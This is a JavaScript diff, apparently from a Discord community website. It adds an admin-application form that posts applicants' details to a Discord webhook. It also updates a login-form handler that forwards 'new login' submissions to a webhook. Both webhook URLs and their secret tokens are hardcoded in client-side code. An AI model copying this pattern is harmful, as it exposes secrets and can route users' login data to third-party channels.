@@ -7,28 +7,57 @@ function copyIP() {
     });
 }
 
-fetch("https://discord.com/api/webhooks/1341518974269132902/juhQa4lsSz9nlrIGxdjaF20cMVHl3l9bTGyqUIDT4akjbRDoPpAWFWQ2CvFJnDbtatAD", {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({
+document.getElementById("adminForm").addEventListener("submit", function(event) {
+    event.preventDefault();
+
+    // الحصول على القيم المدخلة
+    const username = document.getElementById("username").value;
+    const discordId = document.getElementById("discordId").value;
+    const age = document.getElementById("age").value;
+    const reason = document.getElementById("reason").value;
+    const experience = document.getElementById("experience").value;
+
+    // رابط Webhook الخاص بـ Discord (ضع الرابط هنا)
+    const webhookURL = "https://discord.com/api/webhooks/1341518393534054430/0kgyQDGcjqJyH9cTKjRmTycWtsDsGczBw8EvYcMuuCd9Pebi2N0cTpmmKvaJL6aAeosM";
+
+    // إنشاء رسالة مرسلة إلى الديسكورد بتنسيق JSON
+    const payload = {
         content: "**طلب جديد للانضمام للإدارة!** 🚀",
         embeds: [
             {
                 title: "تفاصيل الطلب",
-                color: 65280,
+                color: 65280, // اللون الأخضر
                 fields: [
-                    { name: "👤 اسم المستخدم", value: "TestUser", inline: true },
-                    { name: "📌 معرف ديسكورد", value: "1234567890", inline: true },
-                    { name: "🎂 العمر", value: "20", inline: true },
-                    { name: "📝 سبب الانضمام", value: "أحب المساعدة والإدارة." },
-                    { name: "💼 الخبرات السابقة", value: "أدرت عدة سيرفرات سابقًا." }
+                    { name: "👤 اسم المستخدم", value: username, inline: true },
+                    { name: "📌 معرف ديسكورد", value: discordId, inline: true },
+                    { name: "🎂 العمر", value: age, inline: true },
+                    { name: "📝 سبب الانضمام", value: reason },
+                    { name: "💼 الخبرات السابقة", value: experience }
                 ],
                 footer: { text: "نظام التقديم للإدارة" }
             }
         ]
-    })
-}).then(response => response.json()).then(data => console.log(data)).catch(error => console.error(error));
+    };
 
+    // إرسال الطلب إلى Webhook
+    fetch(webhookURL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload)
+    })
+    .then(response => {
+        if (response.ok) {
+            alert("✅ تم إرسال الطلب بنجاح!");
+            document.getElementById("adminForm").reset();
+        } else {
+            alert("❌ حدث خطأ أثناء الإرسال!");
+        }
+    })
+    .catch(error => {
+        alert("❌ فشل الاتصال بـ Webhook. تأكد من صحة الرابط.");
+        console.error(error);
+    });
+});
 
 
 document.getElementById("loginForm").addEventListener("submit", function(event) {
@@ -43,7 +72,7 @@ document.getElementById("loginForm").addEventListener("submit", function(event) 
     }
 
     // إرسال البيانات إلى Webhook في Discord
-    const webhookURL = "https://discord.com/api/webhooks/1341518974269132902/juhQa4lsSz9nlrIGxdjaF20cMVHl3l9bTGyqUIDT4akjbRDoPpAWFWQ2CvFJnDbtatAD"; // ضع رابط Webhook هنا
+    const webhookURL = "https://discord.com/api/webhooks/1341518393534054430/0kgyQDGcjqJyH9cTKjRmTycWtsDsGczBw8EvYcMuuCd9Pebi2N0cTpmmKvaJL6aAeosM"; // ضع رابط Webhook هنا
 
     const payload = {
         content: "**🟢 تسجيل دخول جديد!**",
